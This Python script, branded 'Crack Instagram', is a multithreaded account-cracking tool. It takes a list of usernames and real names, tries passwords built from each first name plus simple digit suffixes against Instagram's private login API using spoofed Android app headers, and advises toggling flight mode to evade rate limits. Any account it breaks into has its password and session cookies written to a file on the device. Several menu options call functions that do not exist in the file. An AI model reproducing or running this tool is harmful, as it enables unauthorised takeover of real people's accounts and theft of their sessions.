import requests
import json
import re
import time
import hashlib
import random,ssl, socket 
import string
import uuid
import base64,sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

muc=[]
if len(muc) >=1:
	pass

red = '\033[1;91m'
green = '\033[1;32m'
gr = '\033[1;96m'
wit = '\033[1;0m'

cry=(f"""

  ██████   ██████  ███▄    █ 
▒██    ▒ ▒██    ▒  ██ ▀█   █ 
{wit}░ ▓██▄   ░ ▓██▄   ▓██  ▀█ ██▒
  ▒   ██▒  ▒   ██▒▓██▒  ▐▌██▒
{green}▒██████▒▒▒██████▒▒▒██░   ▓██░ \t{gr}Crack Instagram {green}
▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░░ ▒░   ▒ ▒ 
░ ░▒  ░ ░░ ░▒  ░ ░░ ░░   ░ ▒░
░  ░  ░  ░  ░  ░     ░   ░ ░ 
      ░        ░           ░ 
      
{wit}
                             """)
                             
                             
                         
d="""
"Author": Michael,
"Code_name": InstagramClone,
"GitHub": Techmichael112,
"""

secret_key="/auq7agaoqhq81gwijaysns8wkjs8w8282j282y2j2o2n28whwjwjw"


p = print
method = []

def line():
    print("_" * 53)

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def main_file():
    clear()
    print(cry)
    print('\t[ code pushed by Michael - Covenant ]')
    line()
    
    print('1. File Cloner')
    print('2. Public Cloner')
    print('3. Create File')
    
    print('0. Exit program -q')
    print("_" * 53)
    choose = input('Choose: ')
    if choose in ["1", "01"]:
        file_crack()
    elif choose in ["2", "02"]:
        public_cloner(); os.system('clear'); print(' This option will be Uploaded soon!');time.sleep(4);main_file()
    elif choose in ["3", "03"]:
        sort_names();os.system('clear'); print(' This option will be Uploaded soon!');time.sleep(4);main_file()
   
    else:
        print('Choose correct options ..!')
        time.sleep(2)
        main_file()

def file_crack(): 
    try:
        clear()      
        print(cry)
        print('Enter file path example: /sdcard/file.txt...')
        file = input('Put file path: ')
        usernames = open(file, 'r').read().splitlines()
        Next(usernames, file)
    except FileNotFoundError as Error:
        print(f"File not found error: {Error}")
        time.sleep(2)
        exit(2)

def Method():
    global method
    method = []
    print("_" * 53)
    print(cry)
    print(f'\nMethod 1')
    print(f'Method 2')
    print(f'Method 3')
    print("_" * 53)
    c = input('Choose method: ')
    if c in ['01', 'a', 'A', '1']:
        method.append('METHOD1')
    elif c in ['02', '2']:
        method.append('METHOD2')
    elif c in ['3', '03']:
        method.append('METHOD3')
    else:
        print('Choose correctly from (1,2,3). Defaulting to 1.')
        time.sleep(3)
        method.append('METHOD1')
    return method




def Next(usernames, file):
    print(f"Total username collected : {len(usernames)}")
    Method()  
    os.system('clear')
    print(cry)
    p("_" * 53)
    p(f"File path: {file}")
    p("Use a strong connection")
    p(f"Total usernames: {len(usernames)}")
    p("Use flight mode after 10 accounts")
    p("_" * 53)
    def process_user(usr):
    	if "|" in usr and usr.count("|") == 1:
            screen_name, name = usr.split("|")
            screen_name = screen_name.strip()
            name = name.strip()
            first_name = name.split()[0] if name else ""
            if first_name:
                pwd = [
                "opeyemi",
                    "ayomide",
                    "Adeola",
                    first_name,
                    
                    first_name + "123",
                    
                    
                    first_name + "1234",
                    first_name + "12345",
                    first_name + "123456",
                ]
            else:
                pwd = [
                "opeyemi",
                    "ayomide",
                    "Adeola",
                    first_name, 
                    
                    
               
                    first_name + "123",
                    first_name + "1234",
                    first_name + "12345",
                    first_name + "123456",
                    
                ]
            
            if "METHOD1" in method:
                CrackApi(screen_name, pwd)
            elif "METHOD2" in method:
                CrackApi2(screen_name, pwd)
            elif "METHOD3" in method:
                CrackApi3(screen_name, pwd)
    start_time = time.time() 
    with ThreadPoolExecutor(max_workers=56) as executor:
        futures = [executor.submit(process_user, usr) for usr in usernames]
        for future in as_completed(futures):
            future.result()
    print(f"\nProcess completed in {time.time() - start_time:.2f} seconds") 
    sys.exit(2)




red = '\033[1;91m'
green = '\033[1;32m'
wit = '\033[1;0m'
loop = 0
oks = []
cps = []

def CrackApi(screen_name, pas):
    global loop, oks, cps 
    session = requests.Session()   
    sys.stdout.write(f'\r{wit} [Cracking..] {loop} | {green}{len(oks)}{wit} | {red}{len(cps)}{wit}|\r')
    sys.stdout.flush()

    for password in pas:
        try:
            guid = str(uuid.uuid4()) 
            uid = str(uuid.uuid4())
            device_id = 'android-' + str(uuid.uuid4())
            headers = {
    'User-Agent': 'Instagram 275.0.0.27.98 Android (33/13; 320dpi; 720x1438; Xiaomi/Redmi; 23106RN0DA; gale; mt6768; en_US; 458229219)',
    # 'Accept-Encoding': 'zstd',
    'accept-language': 'en-GB, en-US',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'ig-intended-user-id': '0',
    'priority': 'u=3',
    'x-bloks-is-layout-rtl': 'false',
    'x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb',
    'x-fb-client-ip': 'True',
    'x-fb-connection-type': 'MOBILE.LTE',
    'x-fb-friendly-name': 'IgApi: accounts/login/',
    'x-fb-request-analytics-tags': '{"network_tags":{"product":"567067343352427","purpose":"fetch","surface":"undefined","request_category":"api","retry_attempt":"0"}}',
    'x-ig-android-id': 'android-f5eebceb29a5b6cc',
    'x-ig-app-id': '567067343352427',
    'x-ig-app-locale': 'en_US',
    'x-ig-bandwidth-speed-kbps': '758.000',
    'x-ig-bandwidth-totalbytes-b': '0',
    'x-ig-bandwidth-totaltime-ms': '0',
    'x-ig-client-endpoint': 'login_landing',
    'x-ig-capabilities': '3brTv10=',
    'x-ig-connection-type': 'MOBILE(LTE)',
    'x-ig-device-id': 'afcf6020-9663-4fd4-bc1e-498cd74bae75',
    'x-ig-device-locale': 'en_US',
    'x-ig-family-device-id': 'e4383060-da1b-4cf4-8e87-afa270ad1668',
    'x-ig-mapped-locale': 'en_US',
    'x-ig-nav-chain': 'SelfFragment:self_profile:2:main_profile:1738442262.688::,ProfileMediaTabFragment:self_profile:3:button:1738442263.318::,AccountSwitchFragment:account_switch_fragment:5:button:1738442267.193::,AddAccountBottomSheetFragment:add_account_bottom_sheet:6:button:1738442268.257::,LoginLandingFragment:login_landing:7:button:1738442271.382::,LoginLandingFragment:login_landing:8:button:1738442276.656::',
    'x-ig-timezone-offset': '3600',
    'x-ig-www-claim': '0',
    'x-mid': 'Z5zu_wABAAGJ-e20jz7Y9JEav-Cc',
    'x-pigeon-rawclienttime': '1738442294.604',
    'x-pigeon-session-id': 'UFS-39509a8b-4c23-4272-81d4-a08a1f92214b-0',
    'x-tigon-is-retry': 'False',
    'x-fb-http-engine': 'MNS',
    'x-fb-rmd': 'state=URL_ELIGIBLE',
}

            
            
            data = {
                "signed_body": f"SIGNATURE.{{"
                               f'"jazoest":"22442",'
                               f'"country_codes":"[{{\\"country_code\\":\\"44\\",\\"source\\":[\\"default\\"]}}]",'
                               f'"phone_id":"{uid}",'
                               f'"enc_password":"#PWD_INSTAGRAM:0:{int(time.time())}:{password}",'
                               f'"username":"{screen_name}",'
                               f'"adid":"00000000-0000-0000-0000-000000000000",'
                               f'"guid":"{guid}",'
                               f'"device_id":"{device_id}",'
                               f'"google_tokens":"[]",'
                               f'"login_attempt_count":"0"}}'
            }

            response = session.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data)
            
            if response.status_code == 200 and 'logged_in_user' in response.text:
                print(f"\033[1;32m [Successful] {screen_name}|{password}")
                ig_set_authorization = response.headers.get('ig-set-authorization', '')          
                if ig_set_authorization:
                    token = ig_set_authorization.split("Bearer IGT:2:")[1]
                    decoded_data = base64.urlsafe_b64decode(token + "==").decode('utf-8')
                    cokv = json.loads(decoded_data)
                    cokv.update({"csrftoken": "BHBwSC4DMRbwtCUeIP9I6u","datr": "vuppZw3yL5FCCarrpy3iE1wi","ig_did": "71DF54CE-6FCF-4A7D-84A5-12D856079B71","mid": "Z2nqvgALAAHck5Qb2P4u_KdwK9y0","wd": "980x1696","ps_l": "1","ps_n": "1","rur": '"LDC\\05471201572151\\0541767310384:01f7be516801dc40f0841de50fb503a8711635dde7a66f92acbc8358d7c7278dde80c60e"',})
                    cookies = "; ".join([f"{x}={y}" for x, y in cokv.items()])
                    print(f'{gr} Cookie - {cookies}{wit}')
                    oks.append(screen_name)
                    with open('/sdcard/Instagram-OK.txt', 'a') as f:
                        f.write(f'{screen_name}|{password}|{cookies}\n')
                break
            elif 'checkpoint' in response.text or 'login_challenge' in response.text:
                print(f"\033[1;91m [Checkpoint] {screen_name}|{password}")
                cps.append(screen_name)
                with open('/sdcard/Instagram-CP.txt', 'a') as f:
                    f.write(f'{screen_name}|{password}\n')
                break

        except requests.exceptions.ConnectionError:
            time.sleep(20)  
        except Exception as e:         
            pass

    loop += 1 





    

main_file()
